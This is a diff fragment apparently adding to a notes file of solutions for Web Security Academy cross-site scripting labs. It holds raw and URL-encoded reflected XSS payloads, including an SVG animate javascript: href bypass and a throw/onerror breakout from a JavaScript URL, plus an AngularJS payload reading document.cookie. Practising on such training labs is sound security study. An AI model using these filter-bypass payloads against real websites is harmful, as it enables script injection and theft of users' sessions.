@@ -160,5 +160,26 @@ location='https://0a820017045f9aff8069535900db006c.web-security-academy.net/?sea
 location='https://0a820017045f9aff8069535900db006c.web-security-academy.net/?search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';
 </script>
 
+===
+
+Reflected XSS with event handlers and href attributes blocked
+
+// raw payload:
+https://0a26001604ea976380a408dc004c003b.web-security-academy.net/?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
+
+// url encoded:
+https://0a26001604ea976380a408dc004c003b.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
+
+===
+
+Reflected XSS in a JavaScript URL with some characters blocked
+
+// raw payload:
+https://0a0d00c503757a0082e5426800cf00f4.web-security-academy.net/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
+
+// url encoded:
+https://0a0d00c503757a0082e5426800cf00f4.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+
+
 
 
